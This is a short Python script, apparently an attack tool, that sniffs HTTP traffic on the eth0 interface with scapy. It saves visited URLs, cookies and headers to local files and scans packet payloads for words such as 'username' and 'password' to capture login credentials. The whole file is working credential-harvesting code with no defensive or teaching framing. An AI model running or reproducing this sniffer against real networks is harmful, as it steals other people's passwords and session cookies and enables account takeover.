#!/usr/bin/env python

import scapy.all as scapy
from scapy_http import http

from tools import create_directory, add_in_file


def sniff(interface):
    # possibility filter = (udp, arp, tcp, port 21, port 80)
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return str(packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)

def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        for keyword in keywords:
            if keyword in load:
                return load
    return None

def get_cookie(packet):
    return str(packet[http.HTTPRequest].Cookie)

def get_headers(packet):
    return str(packet[http.HTTPRequest].Headers)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print(packet.show())

        url = get_url(packet)
        url_print = "[+] HTTP Request >> " + str(url)
        print(url_print)
        add_in_file(data=url_print + "\n", file="url")

        login_info = get_login(packet)
        if login_info is not None:
            print(login_info)
            login_info_print = """
            >>>>>>>>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<<<<<<<<<
            [+] Possible username/password >> {}
            >>>>>>>>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<<<<<<<<<
            """.format(login_info)
            print(login_info_print)
            add_in_file(data=login_info_print, file="login")

        cookie_info = get_cookie(packet)
        if cookie_info is not None:
            cookie_info_print = """
            [+] Cookie Info >> {}
            """.format(cookie_info)
            add_in_file(data=cookie_info_print, file="cookie")

        headers_info = get_headers(packet)
        if headers_info is not None:
            headers_info_print = """
            [+] Headers info >> {}
            """.format(headers_info)
            add_in_file(data=headers_info_print, file="headers")


keywords = [
    "username",
    "user",
    "login",
    "password",
    "pass",
]

create_directory()
sniff("eth0")
